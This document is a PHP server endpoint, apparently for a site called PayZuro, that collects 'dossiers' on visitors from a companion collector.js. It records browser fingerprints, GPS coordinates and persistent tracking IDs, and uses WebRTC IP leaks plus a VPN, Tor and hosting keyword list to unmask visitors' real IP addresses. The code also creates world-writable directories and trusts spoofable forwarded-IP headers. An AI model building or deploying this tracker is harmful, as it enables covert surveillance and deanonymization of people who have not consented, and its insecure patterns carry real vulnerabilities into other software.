<?php
/**
 * PayZuro Intelligence Collection Endpoint
 * Receives fingerprint/dossier data from collector.js and stores it per session.
 */

session_start();
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'POST only']);
    exit;
}

// Get session ID
$session_id = $_SESSION['id'] ?? null;
if (!$session_id) {
    http_response_code(400);
    echo json_encode(['error' => 'no_session']);
    exit;
}

// Read POST body
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!$data) {
    http_response_code(400);
    echo json_encode(['error' => 'invalid_json']);
    exit;
}

// ─── Server-side enrichment ────────────────────────────────────
function getClientIP() {
    if (isset($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

$server_data = [
    'server_ip' => getClientIP(),
    'server_timestamp' => date('Y-m-d H:i:s T'),
    'request_headers' => [
        'accept' => $_SERVER['HTTP_ACCEPT'] ?? '',
        'accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
        'accept_encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
        'connection' => $_SERVER['HTTP_CONNECTION'] ?? '',
        'cache_control' => $_SERVER['HTTP_CACHE_CONTROL'] ?? '',
        'sec_ch_ua' => $_SERVER['HTTP_SEC_CH_UA'] ?? '',
        'sec_ch_ua_mobile' => $_SERVER['HTTP_SEC_CH_UA_MOBILE'] ?? '',
        'sec_ch_ua_platform' => $_SERVER['HTTP_SEC_CH_UA_PLATFORM'] ?? '',
        'sec_fetch_dest' => $_SERVER['HTTP_SEC_FETCH_DEST'] ?? '',
        'sec_fetch_mode' => $_SERVER['HTTP_SEC_FETCH_MODE'] ?? '',
        'sec_fetch_site' => $_SERVER['HTTP_SEC_FETCH_SITE'] ?? '',
        'upgrade_insecure_requests' => $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? '',
    ],
    'remote_port' => $_SERVER['REMOTE_PORT'] ?? '',
    'server_protocol' => $_SERVER['SERVER_PROTOCOL'] ?? '',
];

// ─── VPN Detection (server-side signals) ───────────────────────
$vpn_indicators = [];

// Check if IP is from known VPN/datacenter ranges (basic check via reverse DNS)
$ip = getClientIP();
$hostname = @gethostbyaddr($ip);
if ($hostname && $hostname !== $ip) {
    $server_data['reverse_dns'] = $hostname;
    $vpn_keywords = ['vpn', 'proxy', 'tor', 'exit', 'relay', 'tunnel',
                     'datacenter', 'cloud', 'server', 'hosting',
                     'amazon', 'aws', 'azure', 'google', 'digitalocean',
                     'linode', 'vultr', 'ovh', 'hetzner', 'contabo'];
    foreach ($vpn_keywords as $kw) {
        if (stripos($hostname, $kw) !== false) {
            $vpn_indicators[] = "reverse_dns_match: $kw in $hostname";
        }
    }
}

// Check timezone mismatch between client-reported and IP-based
if (isset($data['network']['vpn_signals']['timezone'])) {
    $client_tz = $data['network']['vpn_signals']['timezone'];
    // We log both for manual review — automated geo-IP lookup would need an API
    $server_data['client_timezone'] = $client_tz;
}

// Check WebRTC IPs vs server IP
if (isset($data['network']['webrtc_ips']) && is_array($data['network']['webrtc_ips'])) {
    $webrtc_ips = $data['network']['webrtc_ips'];
    $has_different = false;
    foreach ($webrtc_ips as $wip) {
        if ($wip !== $ip && !preg_match('/^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/', $wip)) {
            $has_different = true;
            $vpn_indicators[] = "webrtc_ip_mismatch: WebRTC=$wip vs Server=$ip";
        }
    }
    if ($has_different) {
        $server_data['likely_vpn'] = true;
        $server_data['real_ip_candidates'] = array_values(array_filter($webrtc_ips, function($wip) use ($ip) {
            return $wip !== $ip && !preg_match('/^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/', $wip);
        }));
    }
}

$server_data['vpn_indicators'] = $vpn_indicators;

// ─── Merge client + server data ────────────────────────────────
$dossier = array_merge($data, ['server' => $server_data]);

// ─── Store dossier ─────────────────────────────────────────────
$session_dir = 'records/' . $session_id;
if (!file_exists($session_dir)) {
    mkdir($session_dir, 0777, true);
}

$dossier_file = $session_dir . '/dossier.json';

// If dossier already exists, merge (keep latest behavioral data)
if (file_exists($dossier_file)) {
    $existing = json_decode(file_get_contents($dossier_file), true);
    if ($existing) {
        // Keep first-seen data, update behavioral + location + network
        if (isset($existing['first_seen'])) {
            $dossier['first_seen'] = $existing['first_seen'];
        } else {
            $dossier['first_seen'] = $existing['timestamp'] ?? date('Y-m-d H:i:s T');
        }
        $dossier['update_count'] = ($existing['update_count'] ?? 1) + 1;
    }
} else {
    $dossier['first_seen'] = date('Y-m-d H:i:s T');
    $dossier['update_count'] = 1;
}

$dossier['last_updated'] = date('Y-m-d H:i:s T');

file_put_contents($dossier_file, json_encode($dossier, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// ─── Also append to master log ─────────────────────────────────
$log_entry = date('Y-m-d H:i:s') . " | Session: $session_id | IP: $ip"
    . " | FP: " . ($dossier['fingerprint']['composite_hash'] ?? 'unknown')
    . " | GPS: " . ($dossier['location']['latitude'] ?? 'N/A') . "," . ($dossier['location']['longitude'] ?? 'N/A')
    . " | WebRTC: " . implode(',', $dossier['network']['webrtc_ips'] ?? ['none'])
    . " | VPN: " . (empty($vpn_indicators) ? 'unlikely' : implode('; ', $vpn_indicators))
    . " | Tracking: " . ($dossier['persistence']['tracking_id'] ?? 'none')
    . " | Returning: " . ($dossier['persistence']['is_returning'] ? 'YES' : 'no')
    . PHP_EOL;

file_put_contents('intel_log.txt', $log_entry, FILE_APPEND);

echo json_encode(['status' => 'ok']);
